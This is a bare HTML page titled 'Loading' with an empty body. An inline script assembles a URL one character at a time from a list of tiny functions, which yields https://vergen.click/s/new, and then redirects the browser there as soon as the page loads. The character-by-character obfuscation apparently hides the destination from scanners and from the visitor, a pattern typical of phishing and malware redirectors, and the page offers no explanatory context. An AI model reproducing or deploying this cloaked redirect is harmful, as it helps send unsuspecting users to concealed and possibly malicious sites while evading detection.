<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            _ => 'h',
            _ => 't',
            () => 't',
            () => 'p',
            function() { return 's'; },
            function() { return ':'; },
            _ => '/',
            function() { return '/'; },
            _ => 'v',
            () => 'e',
            () => 'r',
            () => 'g',
            _ => 'e',
            () => 'n',
            function() { return '.'; },
            () => 'c',
            () => 'l',
            _ => 'i',
            _ => 'c',
            function() { return 'k'; },
            function() { return '/'; },
            function() { return 's'; },
            _ => '/',
            () => 'n',
            _ => 'e',
            _ => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
